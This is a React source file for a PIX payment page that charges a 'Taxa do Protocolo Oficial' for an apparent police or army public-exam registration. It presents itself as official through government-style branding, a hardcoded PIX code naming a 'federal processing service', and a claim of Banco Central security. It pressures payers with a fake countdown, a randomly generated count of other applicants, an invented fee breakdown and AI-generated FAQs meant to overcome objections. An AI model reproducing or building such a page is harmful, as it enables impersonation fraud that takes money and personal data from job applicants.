import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { ExercitoHeader } from "@/components/ExercitoHeader";
import { ExercitoFooter } from "@/components/ExercitoFooter";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import {
  Copy,
  CheckCircle,
  AlertTriangle,
  Building,
  Users,
  FileCheck,
  ArrowRight,
  Shield,
  Clock,
  Star,
  Target,
  Award,
  Loader2,
} from "lucide-react";
import { useClarityEvents } from "@/hooks/use-clarity-events";
import { getExamDateFormatted } from "@/utils/examDate";
import { useQuery } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { fireGtmBeginCheckout, fireGtmPurchase } from "@/lib/gtm";
import { useEstadoPM } from "@/hooks/useEstadoPM";

export default function PagamentoPage() {
  const [, setLocation] = useLocation();
  const estadoPM = useEstadoPM();
  const sigla = estadoPM?.sigla ?? 'PM';
  const [pixCode, setPixCode] = useState("");
  const [qrCode, setQrCode] = useState("");
  const [copied, setCopied] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [examDate, setExamDate] = useState("");
  const [examTime, setExamTime] = useState("");
  const [firstName, setFirstName] = useState("");
  const [cityName, setCityName] = useState("");
  const [timeLeft, setTimeLeft] = useState(600); // 10 minutes in seconds
  const [isPaymentConfirmed, setIsPaymentConfirmed] = useState(false);
  const [socialProofCount] = useState(() => Math.floor(Math.random() * 81) + 180); // 180-260
  const [transactionId, setTransactionId] = useState("");
  const [purchaseEventFired, setPurchaseEventFired] = useState(false);
  const [userData, setUserData] = useState<any>(null);
  const [pessoalData, setPessoalData] = useState<any>(null);
  const pixAmount = parseFloat(
    localStorage.getItem("validacaoPixAmount") || "78.85",
  );
  const [personalizedFAQs, setPersonalizedFAQs] = useState<any>(null);
  const [isLoadingFAQs, setIsLoadingFAQs] = useState(false);
  const {
    trackPixCodeCopy,
    trackPixQRCodeView,
    trackPaymentMethod,
    trackEvent,
  } = useClarityEvents();

  // Fetch compatibility analysis data
  const { data: analiseExercito, isLoading: isLoadingAnalise } = useQuery({
    queryKey: ["/api/analise-exercito", userData, pessoalData],
    queryFn: async () => {
      if (!userData || !pessoalData) return null;

      const response = await fetch("/api/analise-exercito", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userData,
          pessoalData,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to fetch analysis");
      }

      return await response.json();
    },
    enabled: !!(userData && pessoalData),
    retry: false,
    staleTime: 5 * 60 * 1000, // 5 minutes
  });

  useEffect(() => {
    window.scrollTo(0, 0);

    // Facebook Pixel - InitiateCheckout event
    const fbq = (window as any).fbq;
    if (fbq) {
      fbq("track", "InitiateCheckout", {
        content_name: `Concurso Público ${sigla} 2026`,
        content_category: "Payment Process",
        value: 98.34,
        currency: "BRL",
      });
    }

    // Extract first name from userData and load pessoalData
    const userDataString = localStorage.getItem("userData");
    const pessoalDataString = localStorage.getItem("pessoalData");

    if (userDataString) {
      try {
        const parsedUserData = JSON.parse(userDataString);
        setUserData(parsedUserData);
        // Check for 'name' field first, then fallback to other fields
        const fullName =
          parsedUserData.name ||
          parsedUserData.autoFilledData?.nome ||
          parsedUserData.nomeCompleto ||
          "";
        if (fullName) {
          const firstNameFromData = fullName.split(" ")[0];
          const capitalizedFirstName =
            firstNameFromData.charAt(0).toUpperCase() +
            firstNameFromData.slice(1).toLowerCase();
          setFirstName(capitalizedFirstName);
        }
      } catch (error) {
        console.log("Error loading user data:", error);
      }
    }

    if (pessoalDataString) {
      try {
        const parsedPessoalData = JSON.parse(pessoalDataString);
        setPessoalData(parsedPessoalData);
      } catch (error) {
        console.log("Error loading pessoal data:", error);
      }
    }

    const pixTransactionData = localStorage.getItem("pixTransaction");

    if (pixTransactionData) {
      try {
        const pixData = JSON.parse(pixTransactionData);
        setPixCode(pixData.pixCode || pixData.pix_qr_code || "");
        setQrCode(
          pixData.qrCode || pixData.qr_code_image || pixData.qrCodeImage || "",
        );
        const txId = pixData.transactionId || pixData.id || ""
        setTransactionId(txId);

        fireGtmBeginCheckout({ transactionId: txId, value: pixAmount })

        setExamDate(getExamDateFormatted());

        const userData = JSON.parse(localStorage.getItem("userData") || "{}");
        setExamTime(
          JSON.parse(localStorage.getItem("applicationData") || "{}")
            ?.examTime || "08:00",
        );

        // Get city name from userData
        const cityFromData =
          userData.autoFilledData?.cidade || userData.cidade || "sua cidade";
        setCityName(cityFromData);
      } catch (error) {
        console.error("Error loading PIX transaction data:", error);
        setLocation("/validacao");
        return;
      }
    } else {
      setLocation("/validacao");
      return;
    }
  }, [setLocation]);

  // Timer countdown effect
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Payment verification effect
  useEffect(() => {
    if (!transactionId || isPaymentConfirmed) return;

    const checkPayment = async () => {
      try {
        const response = await fetch(
          `/api/verificar-status-pagamento/${transactionId}`,
          {
            method: "GET",
            headers: {
              "Content-Type": "application/json",
            },
          },
        );

        const result = await response.json();

        // Log para debug
        console.log("Resposta completa da API:", result);

        // A API retorna: { success: true, data: { status: 'paid', ... } }
        const currentStatus = (
          result.data?.status ||
          result.status ||
          ""
        ).toLowerCase();
        console.log("Status atual do pagamento:", currentStatus);

        if (
          currentStatus === "paid" ||
          currentStatus === "completed" ||
          currentStatus === "approved"
        ) {
          console.log("Pagamento confirmado! Status:", currentStatus);
          setIsPaymentConfirmed(true);

          fireGtmPurchase({ transactionId, value: pixAmount });
          window.alert("Pagamento confirmado! Redirecionando para o Portal...")
          await new Promise(resolve => setTimeout(resolve, 1900));
          setLocation("/login-pos-pagamento?protocol_id=" + transactionId);
        }
      } catch (error) {
        console.error("Error checking payment status:", error);
      }
    };

    const paymentCheckInterval = setInterval(checkPayment, 2300);

    return () => clearInterval(paymentCheckInterval);
  }, [transactionId, isPaymentConfirmed, setLocation]);

  // Format time for display
  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, "0")}`;
  };

  const copyPixCode = () => {
    navigator.clipboard.writeText(pixCode).then(() => {
      setCopied(true);
      // Track PIX code copy action
      trackPixCodeCopy(pixAmount, "click");
      setTimeout(() => setCopied(false), 3000);
    });
  };

  const steps = [
    { icon: Building, text: "Abra seu app bancário" },
    { icon: Copy, text: "Selecione PIX" },
    { icon: CheckCircle, text: "Escaneie ou cole o código" },
    {
      icon: FileCheck,
      text: `Confirme R$ ${pixAmount.toFixed(2).replace(".", ",")}`,
    },
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentStep((prev) => {
        if (prev >= steps.length - 1) {
          return prev; // Stop at the last step
        }
        return prev + 1;
      });
    }, 2000);
    return () => clearInterval(timer);
  }, []);

  // Função para buscar FAQ personalizado que quebra objeções com cache otimizado
  const fetchPersonalizedFAQs = async () => {
    try {
      setIsLoadingFAQs(true);

      // Primeiro: verificar se existe FAQ pré-carregado da página de registro
      const preloadedFAQ = localStorage.getItem("preloadedPaymentFAQ");
      if (preloadedFAQ) {
        try {
          const parsedPreloadedFAQ = JSON.parse(preloadedFAQ);
          const preloadTime = new Date(parsedPreloadedFAQ.timestamp);
          const now = new Date();
          const timeDiff = (now.getTime() - preloadTime.getTime()) / 1000 / 60; // em minutos

          // Se o FAQ pré-carregado tem menos de 10 minutos, usar ele
          if (timeDiff < 10 && parsedPreloadedFAQ.data?.faqs) {
            console.log(
              "Usando FAQ pré-carregado do registro (idade:",
              timeDiff.toFixed(1),
              "min)",
            );
            setPersonalizedFAQs(parsedPreloadedFAQ.data);

            // Track uso do FAQ pré-carregado
            trackEvent("payment_faq_preloaded_used", {
              page: "pagamento_page",
              preload_age_minutes: timeDiff,
              faq_count: parsedPreloadedFAQ.data.faqs.length,
              from_cache: parsedPreloadedFAQ.data.fromCache,
            });

            setIsLoadingFAQs(false);
            return;
          } else {
            console.log(
              "FAQ pré-carregado expirado (idade:",
              timeDiff.toFixed(1),
              "min), buscando novo",
            );
            localStorage.removeItem("preloadedPaymentFAQ");
          }
        } catch (error) {
          console.log("Erro ao processar FAQ pré-carregado:", error);
          localStorage.removeItem("preloadedPaymentFAQ");
        }
      }

      // Segundo: se não há FAQ pré-carregado válido, buscar novo
      const userData = localStorage.getItem("userData");
      const pessoalData = localStorage.getItem("pessoalData");

      if (!userData || !pessoalData) {
        console.log("Dados de usuário não encontrados para FAQ personalizado");
        return;
      }

      console.log("Buscando novo FAQ de pagamento...");
      const response = await fetch("/api/faq-pagamento", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userData: JSON.parse(userData),
          pessoalData: JSON.parse(pessoalData),
        }),
      });

      const result = await response.json();

      if (result.success && result.data.faqs) {
        setPersonalizedFAQs(result.data);

        // Track FAQ generation completion
        trackEvent("payment_faq_generated", {
          page: "pagamento_page",
          faq_count: result.data.faqs.length,
          candidate_age: result.data.candidato?.idade,
          candidate_gender: result.data.candidato?.genero,
          from_cache: result.data.fromCache || false,
          cache_stats: result.data.cacheStats,
        });

        console.log("FAQ de pagamento carregado:", {
          fromCache: result.data.fromCache,
          faqCount: result.data.faqs.length,
        });
      }
    } catch (error) {
      console.error("Erro ao buscar FAQ personalizado:", error);
      // Em caso de erro, continua usando FAQ estático
    } finally {
      setIsLoadingFAQs(false);
    }
  };

  // Buscar FAQ personalizado quando os dados estiverem disponíveis
  useEffect(() => {
    if (userData && pessoalData && !personalizedFAQs && !isLoadingFAQs) {
      fetchPersonalizedFAQs();
    }
  }, [userData, pessoalData]);

  const faqItems = [
    {
      question: "Para que serve esta taxa?",
      answer:
        "Taxa obrigatória para emissão do Protocolo Oficial de Seleção e provisão de recursos para aplicação da prova.",
    },
    {
      question: "Posso cancelar após o pagamento?",
      answer:
        "Não. Após o pagamento, o sistema já provisiona os recursos para a prova. O código PIX expira em 48 horas e, após esse prazo, será necessário reiniciar o processo de inscrição.",
    },
    {
      question: "Quando expira o PIX?",
      answer:
        "O código PIX expira em 48 horas. Após isso, será necessário gerar um novo.",
    },
    {
      question: "O que acontece se não pagar?",
      answer:
        "O código PIX expira em 48 horas. Após isso, será necessário reiniciar o processo de inscrição para gerar um novo código de pagamento.",
    },
  ];

  return (
    <div className="min-h-screen flex flex-col">
      <ExercitoHeader customTitle={sigla} customSubtitle="Pagamento da Taxa" />

      <main className="flex-1 container mx-auto max-w-4xl px-4 py-6">
        {/* Urgency Alert */}
        <div className="mb-6 p-4 bg-amber-50 border border-amber-200 rounded-lg">
          <div className="flex items-center">
            <AlertTriangle className="w-5 h-5 text-amber-600 mr-3" />
            <div className="flex-1">
              <p className="text-amber-900 font-medium text-sm">
                Confirme sua vaga antes do encerramento do edital
              </p>
              <div className="flex items-center mt-1">
                <Clock className="w-4 h-4 text-amber-700 mr-1" />
                <p className="text-amber-800 text-sm">
                  Reserva válida por{" "}
                  <span className="font-semibold">{formatTime(timeLeft)}</span>{" "}
                  minutos
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Header */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-semibold text-gray-900 mb-2">
            {firstName
              ? `${firstName}, efetue o pagamento da Taxa do Protocolo Oficial`
              : "Taxa do Protocolo Oficial de Seleção"}
          </h1>
          <div className="text-3xl font-bold text-[#1351b4] mb-1">
            R$ {pixAmount.toFixed(2).replace(".", ",")}
          </div>
          <p className="text-sm text-gray-600">
            Prova agendada para {examDate} às {examTime}
          </p>
        </div>

        <div className="grid lg:grid-cols-2 gap-8">
          {/* PIX Payment Section */}
          <Card className="border-0 shadow-sm">
            <CardContent className="p-6">
              <h2 className="text-lg font-medium text-gray-900 mb-6">
                Como pagar
              </h2>

              {/* Animated Tutorial */}
              <div className="mb-6">
                <div className="flex items-center justify-between mb-4">
                  {steps.map((step, index) => {
                    const Icon = step.icon;
                    return (
                      <div key={index} className="flex flex-col items-center">
                        <div
                          className={`w-10 h-10 rounded-full flex items-center justify-center transition-all duration-500 ${
                            index === currentStep
                              ? "bg-[#1351b4] text-white scale-110"
                              : "bg-gray-200 text-gray-500"
                          }`}
                        >
                          <Icon className="w-5 h-5" />
                        </div>
                        <span
                          className={`text-xs mt-2 text-center transition-colors duration-500 ${
                            index === currentStep
                              ? "text-[#1351b4] font-medium"
                              : "text-gray-500"
                          }`}
                        >
                          {step.text}
                        </span>
                      </div>
                    );
                  })}
                </div>
                <div className="w-full bg-gray-200 rounded-full h-1 mb-4">
                  <div
                    className="bg-[#1351b4] h-1 rounded-full transition-all duration-500"
                    style={{
                      width: `${((currentStep + 1) / steps.length) * 100}%`,
                    }}
                  ></div>
                </div>
              </div>

              {/* QR Code */}
              <div className="bg-white rounded-lg border p-4 mb-4">
                {currentStep === 3 && pixCode ? (
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(pixCode)}`}
                    alt="QR Code PIX"
                    className="w-40 h-40 mx-auto object-contain"
                  />
                ) : (
                  <div className="w-40 h-40 mx-auto bg-gray-100 rounded-lg flex items-center justify-center">
                    <p className="text-gray-500 text-sm">
                      {currentStep < 3
                        ? "Siga os passos acima"
                        : "Carregando QR Code..."}
                    </p>
                  </div>
                )}
              </div>

              {/* PIX Code Copy */}
              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-700">
                  Código PIX:
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={
                      "00020126870014br.gov.bcb.pix2565qrcode.gov.br/qr/v3/at/da19d6fc-652c-4a48-8668-ebfba4f377925204000053039865802BR5925SERVIÇO DE PROCESSAMENTO FEDERAL62070503***6304B831"
                    }
                    readOnly
                    className="flex-1 px-3 py-2 text-xs border border-gray-300 rounded-lg bg-gray-50 font-mono"
                  />
                  <Button
                    onClick={copyPixCode}
                    className={`px-4 transition-all duration-300 ${
                      copied
                        ? "bg-green-600 hover:bg-green-700 scale-105"
                        : "bg-[#1351b4] hover:bg-[#0d3d8f]"
                    }`}
                  >
                    {copied ? (
                      <CheckCircle className="w-4 h-4" />
                    ) : (
                      <Copy className="w-4 h-4" />
                    )}
                  </Button>
                </div>
                {copied && (
                  <div className="flex items-center gap-2 text-green-600 text-sm animate-pulse">
                    <CheckCircle className="w-4 h-4" />
                    Código copiado com sucesso!
                  </div>
                )}
              </div>

              {/* Development Test Button */}

              {import.meta.env.VITE_DEVELOPING === "true" &&
                !isPaymentConfirmed && (
                  <div className="mt-6">
                    <Button
                      onClick={() => {
                        setIsPaymentConfirmed(true);
                        if (!purchaseEventFired) {
                          fireGtmPurchase({ transactionId, value: pixAmount });
                          setPurchaseEventFired(true);
                        }

                        setTimeout(() => {
                          // Redirect to success page or completion
                          window.location.href = "/";
                        }, 3000);
                      }}
                      className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 px-4 rounded-lg font-medium"
                    >
                      TESTE: SIMULAR PAGAMENTO
                    </Button>
                  </div>
                )}

              {/* Payment Status */}
              {isPaymentConfirmed && (
                <div className="mt-6">
                  <div className="w-full bg-green-100 border border-green-300 text-green-800 py-3 px-4 rounded-lg text-center">
                    <div className="flex items-center justify-center gap-2">
                      <CheckCircle className="w-5 h-5" />
                      <span className="font-semibold">
                        Pagamento Confirmado!
                      </span>
                    </div>
                    <p className="text-xs text-green-600 mt-1">
                      📧 Comprovante oficial será enviado por e-mail em até 3
                      horas
                    </p>
                    <p className="text-xs text-green-600 mt-1">
                      Redirecionando em instantes...
                    </p>
                  </div>
                </div>
              )}

              {/* Security Information */}
              <div className="mt-4 pt-3 border-t border-gray-100">
                <div className="flex items-center gap-2 text-gray-600">
                  <Shield className="w-4 h-4" />
                  <span className="text-xs">
                    Segurança garantida através do{" "}
                    <strong>Banco Central</strong> • Dados protegidos
                  </span>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Information Section */}
          <div className="space-y-6">
            {/* Where the money goes */}
            <Card className="border-0 shadow-sm">
              <CardContent className="p-6">
                <h3 className="text-lg font-medium text-gray-900 mb-4">
                  Destino da Taxa
                </h3>
                <div className="flex items-center gap-2 bg-blue-50 border border-blue-100 rounded p-3 mb-4">
                  <Users className="w-4 h-4 text-blue-600 flex-shrink-0" />
                  <p className="text-xs text-blue-800">
                    <strong>{socialProofCount}</strong> candidatos já geraram o Protocolo Oficial de Seleção hoje.
                  </p>
                </div>
                <div className="space-y-3">
                  {(() => {
                    const protocolo = parseFloat(
                      ((45.0 / 78.85) * pixAmount).toFixed(2),
                    );
                    const provisao = parseFloat(
                      ((25.0 / 78.85) * pixAmount).toFixed(2),
                    );
                    const logistica = parseFloat(
                      (pixAmount - protocolo - provisao).toFixed(2),
                    );
                    const fmt = (v: number) =>
                      `R$ ${v.toFixed(2).replace(".", ",")}`;
                    return (
                      <>
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                            <FileCheck className="w-4 h-4 text-blue-600" />
                          </div>
                          <div>
                            <p className="text-sm font-medium">
                              Protocolo Oficial
                            </p>
                            <p className="text-xs text-gray-600">
                              {fmt(protocolo)}
                            </p>
                          </div>
                        </div>
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                            <Users className="w-4 h-4 text-green-600" />
                          </div>
                          <div>
                            <p className="text-sm font-medium">
                              Provisão de Recursos
                            </p>
                            <p className="text-xs text-gray-600">
                              {fmt(provisao)}
                            </p>
                          </div>
                        </div>
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 bg-orange-100 rounded-full flex items-center justify-center">
                            <Building className="w-4 h-4 text-orange-600" />
                          </div>
                          <div>
                            <p className="text-sm font-medium">
                              Logística da Prova
                            </p>
                            <p className="text-xs text-gray-600">
                              {fmt(logistica)}
                            </p>
                          </div>
                        </div>
                      </>
                    );
                  })()}
                </div>
              </CardContent>
            </Card>

            {/* Compatibility Analysis Card */}
            {analiseExercito?.success &&
              analiseExercito?.data &&
              !isLoadingAnalise && (
                <Card className="border-[#1351b4]/20 bg-gradient-to-r from-[#1351b4]/5 to-blue-50">
                  <CardContent className="p-6">
                    <div className="flex items-start gap-3">
                      <div className="w-10 h-10 bg-[#1351b4]/10 rounded-full flex items-center justify-center flex-shrink-0">
                        <Award className="w-5 h-5 text-[#1351b4]" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-lg font-medium text-[#1351b4] mb-2">
                          Análise de Compatibilidade para o Concurso
                        </h3>
                        {analiseExercito.data.analise?.areas_compatibilidade &&
                          analiseExercito.data.analise.areas_compatibilidade
                            .length > 0 && (
                            <div className="mb-3">
                              <p className="text-sm text-gray-700 mb-2">
                                Áreas recomendadas para seu perfil:
                              </p>
                              <div className="flex flex-wrap gap-2">
                                {analiseExercito.data.analise.areas_compatibilidade
                                  .slice(0, 3)
                                  .map((area: string, index: number) => (
                                    <span
                                      key={index}
                                      className="inline-flex items-center gap-1 px-3 py-1 bg-[#1351b4]/10 text-[#1351b4] text-xs font-medium rounded-full"
                                    >
                                      <Target className="w-3 h-3" />
                                      {area}
                                    </span>
                                  ))}
                              </div>
                            </div>
                          )}
                        {analiseExercito.data.analise
                          ?.valorizacao_trajetoria && (
                          <div className="text-sm text-gray-700">
                            <span className="font-medium">
                              Compatibilidade:
                            </span>{" "}
                            {
                              analiseExercito.data.analise
                                .valorizacao_trajetoria
                            }
                          </div>
                        )}
                      </div>
                    </div>
                  </CardContent>
                </Card>
              )}

            {/* Loading state for analysis */}
            {isLoadingAnalise && userData && (
              <Card className="border-gray-200 bg-gray-50">
                <CardContent className="p-6">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
                      <Award className="w-5 h-5 text-gray-400" />
                    </div>
                    <div>
                      <h3 className="text-lg font-medium text-gray-600 mb-1">
                        Analisando Compatibilidade...
                      </h3>
                      <p className="text-sm text-gray-500">
                        Processando seu perfil para áreas da corporação
                      </p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Warning */}
            <Card className="border-red-200 bg-red-50">
              <CardContent className="p-6">
                <div className="flex items-start gap-3">
                  <AlertTriangle className="w-6 h-6 text-red-600 mt-0.5 flex-shrink-0" />
                  <div>
                    <h3 className="text-lg font-medium text-red-900 mb-2">
                      Aviso Importante
                    </h3>
                    <p className="text-sm text-red-800">
                      Não finalize depois — este edital não aceita renegociação
                      de prazo após vencimento da guia de pagamento.
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* FAQ */}
            <Card className="border-0 shadow-sm">
              <CardContent className="p-6">
                <h3 className="text-lg font-medium text-gray-900 mb-4">
                  {personalizedFAQs
                    ? "Perguntas Personalizadas Para Você"
                    : "Perguntas Frequentes"}
                </h3>

                {/* Loading state para FAQ personalizado */}
                {isLoadingFAQs && (
                  <div className="flex items-center justify-center space-x-3 py-8">
                    <Loader2 className="w-5 h-5 text-[#1351b4] animate-spin" />
                    <p className="text-gray-600">
                      Gerando perguntas específicas para seu perfil...
                    </p>
                  </div>
                )}

                {/* FAQ Personalizado por IA */}
                {personalizedFAQs?.faqs && !isLoadingFAQs && (
                  <div className="space-y-3">
                    {personalizedFAQs.faqs.map((faq: any, index: number) => (
                      <details key={index} className="group">
                        <summary className="flex items-center justify-between cursor-pointer text-sm font-medium text-gray-700 hover:text-[#1351b4] transition-colors">
                          {faq.question}
                          <ArrowRight className="w-4 h-4 transition-transform group-open:rotate-90" />
                        </summary>
                        <p className="mt-2 text-sm text-gray-600 pl-4 border-l-2 border-gray-200">
                          {faq.answer}
                        </p>
                      </details>
                    ))}
                  </div>
                )}

                {/* FAQ Fixo (fallback) */}
                {!personalizedFAQs?.faqs && !isLoadingFAQs && (
                  <div className="space-y-3">
                    {faqItems.map((item, index) => (
                      <details key={index} className="group">
                        <summary className="flex items-center justify-between cursor-pointer text-sm font-medium text-gray-700 hover:text-[#1351b4] transition-colors">
                          {item.question}
                          <ArrowRight className="w-4 h-4 transition-transform group-open:rotate-90" />
                        </summary>
                        <p className="mt-2 text-sm text-gray-600 pl-4 border-l-2 border-gray-200">
                          {item.answer}
                        </p>
                      </details>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </main>

      <ExercitoFooter />
    </div>
  );
}
